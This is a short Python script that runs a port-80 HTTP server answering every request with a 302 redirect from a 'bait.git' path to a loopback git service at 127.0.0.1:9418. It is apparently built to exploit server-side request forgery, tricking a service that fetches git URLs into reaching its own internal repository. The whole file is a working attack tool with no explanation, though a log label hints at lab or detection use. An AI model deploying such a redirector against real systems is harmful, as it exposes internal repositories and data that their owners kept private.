#!/usr/bin/env python3
"""302 bait.git -> loopback git HTTP. Preserves path suffix and query."""
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

INNER = "http://127.0.0.1:9418/internal.git"


class H(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        print("IOC redir", self.command, self.path)

    def do_GET(self):
        path = self.path
        if path.startswith("/bait.git"):
            rest = path[len("/bait.git") :]
            loc = INNER + rest
        else:
            loc = INNER + path
        self.send_response(302)
        self.send_header("Location", loc)
        self.send_header("Content-Length", "0")
        self.end_headers()

    do_HEAD = do_GET
    do_POST = do_GET


if __name__ == "__main__":
    ThreadingHTTPServer(("0.0.0.0", 80), H).serve_forever()
